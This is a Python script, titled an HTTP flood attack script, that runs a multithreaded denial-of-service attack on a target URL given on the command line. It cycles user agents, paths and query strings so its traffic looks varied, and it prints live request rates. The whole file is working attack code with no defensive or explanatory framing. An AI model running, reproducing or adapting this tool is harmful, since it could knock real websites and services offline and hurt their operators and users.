#!/usr/bin/python3
"""
HTTP Flood Attack Script
"""

import sys
import time
import random
import threading
import requests
from concurrent.futures import ThreadPoolExecutor

class HTTPFlood:
    def __init__(self, target_url, duration=60, max_workers=50):
        self.target_url = target_url if target_url.startswith('http') else f'http://{target_url}'
        self.duration = duration
        self.max_workers = max_workers
        self.request_count = 0
        self.success_count = 0
        self.running = True
        
        # User agents
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        
        # Paths
        self.paths = ['/', '/index.html', '/api/status', '/slow', '/error']
    
    def make_request(self, session):
        try:
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            url = self.target_url + random.choice(self.paths)
            if random.random() > 0.5:
                url += f'?id={random.randint(1,1000)}'
            
            response = session.get(url, headers=headers, timeout=2)
            
            self.request_count += 1
            self.success_count += 1
            
            return True
        except:
            self.request_count += 1
            return False
    
    def worker(self, worker_id, session):
        requests_made = 0
        while self.running:
            self.make_request(session)
            requests_made += 1
            
            if requests_made % 100 == 0:
                print(f"[Worker {worker_id}] Requests: {requests_made}")
            
            time.sleep(random.uniform(0.01, 0.1))
    
    def start(self):
        print(f"[+] Starting HTTP Flood attack")
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Duration: {self.duration} seconds")
        print(f"[+] Workers: {self.max_workers}")
        print("=" * 50)
        
        session = requests.Session()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for i in range(self.max_workers):
                future = executor.submit(self.worker, i, session)
                futures.append(future)
            
            start_time = time.time()
            try:
                while time.time() - start_time < self.duration:
                    elapsed = time.time() - start_time
                    remaining = self.duration - elapsed
                    
                    if elapsed > 0:
                        rps = self.request_count / elapsed
                    else:
                        rps = 0
                    
                    success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
                    
                    print(f"\r[+] Time: {elapsed:.1f}s | Requests: {self.request_count:,} | "
                          f"RPS: {rps:.1f} | Success: {success_rate:.1f}%", end="")
                    
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print("\n[!] Attack interrupted by user")
            
            self.running = False
            executor.shutdown(wait=True)
        
        print(f"\n\n[+] Attack completed")
        print(f"[+] Total requests: {self.request_count:,}")
        print(f"[+] Successful: {self.success_count:,}")
        print(f"[+] Success rate: {(self.success_count/self.request_count*100 if self.request_count > 0 else 0):.1f}%")
        print("=" * 50)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 http_flood.py <target_url> [duration] [workers]")
        print("Example: python3 http_flood.py http://192.168.1.5 60 50")
        sys.exit(1)
    
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
    workers = int(sys.argv[3]) if len(sys.argv) > 3 else 50
    
    attacker = HTTPFlood(target, duration=duration, max_workers=workers)
    attacker.start()
